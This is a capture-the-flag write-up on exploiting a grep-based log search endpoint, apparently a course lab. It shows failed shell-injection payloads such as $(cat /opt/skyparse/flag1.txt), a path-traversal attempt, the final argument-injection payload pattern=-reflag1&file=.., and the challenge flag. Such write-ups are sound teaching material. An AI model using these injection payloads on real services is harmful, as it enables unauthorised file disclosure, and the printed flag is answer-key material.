# 🛰️ SkyParse Analytics – CMDi Challenge Writeup

## 📌 Overview

* **Category:** Web Exploitation
* **Challenge Type:** Command Injection (CMDi) → Argument Injection
* **Target Endpoint:** `/cmdi/search`
* **Goal:** Retrieve the flag from:

  ```
  /opt/skyparse/flag1.txt
  ```

---

## 🔍 Recon & Initial Analysis

The application provides a **log search interface** labeled:

> “Search across log files using pattern matching.”

From the **About page**, we learn:

> The system uses `grep` under the hood.

This strongly suggests that user input is passed into a system-level command involving `grep`.

---

## 🧪 Step 1 – Finding the Injection Point

Using **Burp Suite**, we intercept the request:

```http
GET /cmdi/search?pattern=test&file=
```

The `pattern` parameter is directly controlled by the user and becomes the primary injection vector.

---

## ⚠️ Step 2 – Testing for Command Injection

Initial payloads tested:

```bash
$(ls)
; ls
```

However:

* `$()` was **not executed**
* Input appeared **literally in output**

Example response:

```
grep results for: $(cat/opt/skyparse/flag1.txt)
```

### ❌ Conclusion:

No shell execution → **Not traditional command injection**

---

## 🔥 Step 3 – Identifying Argument Injection

Testing with:

```http
pattern=--help
```

Returned:

```
Usage: grep [OPTION]... PATTERNS [FILE]...
```

### ✅ Conclusion:

> The application is vulnerable to **argument injection into `grep`**

Likely backend behavior:

```bash
grep <pattern> /app/logs/<file>
```

---

## 🚫 Step 4 – Failed Exploitation Attempts

### ❌ 1. Shell Injection

* `$()` not evaluated
* No command execution

### ❌ 2. Path Traversal via `file`

```http
file=../../../../opt/skyparse/flag1.txt
```

Result:

```
/app/logs/flag1.txt: No such file or directory
```

### Insight:

The application likely uses something like:

```bash
basename(file)
```

→ Preventing directory traversal

---

## 🧠 Step 5 – Key Constraint

A critical discovery:

> The entire `pattern` value is treated as **one single argument**

So this fails:

```bash
-f /opt/skyparse/flag1.txt -e .
```

Because it becomes:

```bash
grep "-f /opt/skyparse/flag1.txt -e ." ...
```

---

## 🔓 Step 6 – Exploiting Grep Behavior

We pivot to **grep-native flags** that work **without spaces**.

Useful flags:

* `-r` → recursive search
* `-e` → pattern specification

---

## 🚀 Step 7 – Final Exploit

### Payload:

```http
GET /cmdi/search?pattern=-reflag1&file=..
```

---

## 🧠 Why This Works

* `file=..` → `/app/logs/..` → `/app`
* `-r` → recursive search
* `-e flag1` → search for keyword “flag1”

This forces `grep` to search outside the intended directory and locate references to the flag.

---

## 🏁 Flag

```
FLAG_EASY:-CYBR3200{default_easy}
```

---

## 🧠 Key Takeaways

### 🔹 1. Not All CMDi Is Shell Injection

* `$()` failed → no shell
* Required pivoting to argument-based exploitation

---

### 🔹 2. Argument Injection Can Be Just as Powerful

* Injecting `--help` confirmed control over `grep`
* Enabled abuse of built-in flags

---

### 🔹 3. Constraints Shape Exploitation

* Single-argument restriction forced creative payloads
* Required combining flags (`-reflag1`)

---

### 🔹 4. Always Pivot When Assumptions Break

| Initial Assumption      | Reality |
| ----------------------- | ------- |
| Shell Injection         | ❌       |
| Grep Argument Injection | ✅       |

---

## 🛠️ Tools Used

* **Burp Suite** (Proxy + Repeater)
* Web Browser DevTools

---

## 💬 Final Thoughts

This challenge demonstrates that:

> Understanding how underlying tools work (like `grep`) is more important than memorizing payloads.

Instead of forcing command injection, the solution required:

* Careful observation
* Iterative testing
* Adapting to constraints

---

## ✍️ Author

*Writeup by Savannah Holiday*

